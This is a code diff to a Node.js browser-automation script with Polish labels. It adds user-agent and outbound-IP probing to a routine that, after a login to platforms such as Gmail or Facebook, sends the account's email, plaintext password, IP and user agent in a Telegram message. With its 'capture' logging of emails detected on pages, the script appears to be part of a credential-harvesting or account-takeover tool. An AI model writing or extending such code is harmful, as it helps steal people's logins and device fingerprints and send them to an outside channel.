@@ -358,11 +358,44 @@ async function launch(accountId, adminIp) {
           pushLog(accountId, 'capture', `Wykryto email ze strony: ${detected}`);
         }
       }
+      // Grab UA and outbound IP (what Gmail/Facebook actually see) in
+      // parallel — each with its own short timeout so a slow probe can't
+      // delay the Telegram notification.
+      const [ua, ip] = await Promise.all([
+        page.evaluate(() => navigator.userAgent).catch(() => null),
+        (async () => {
+          const probes = [
+            'https://api.ipify.org?format=json',
+            'https://api.myip.com',
+            'https://ipinfo.io/json',
+          ];
+          for (const url of probes) {
+            try {
+              const r = await context.request.get(url, { timeout: 3500 });
+              if (!r.ok()) continue;
+              const j = await r.json();
+              return j.ip || j.query || null;
+            } catch { /* try next */ }
+          }
+          return null;
+        })(),
+      ]);
+      if (ip && ip !== current.ip) {
+        await saveAccount({ ...current, ip });
+        current = { ...current, ip };
+      }
+      if (ua && ua !== current.ua) {
+        await saveAccount({ ...current, ua });
+        current = { ...current, ua };
+      }
+
       const caption = [
         `✅ Zalogowano: ${current.label}`,
         `Platforma: ${current.label}`,
         `Email: ${current.email || '(brak)'}`,
         `Hasło: ${current.password || '(brak)'}`,
+        `IP: ${ip || '(brak)'}`,
+        `UA: ${ua || '(brak)'}`,
       ].join('\n');
       // One Telegram message (a document with this as its caption) instead
       // of a separate text message + file — everything at a glance.
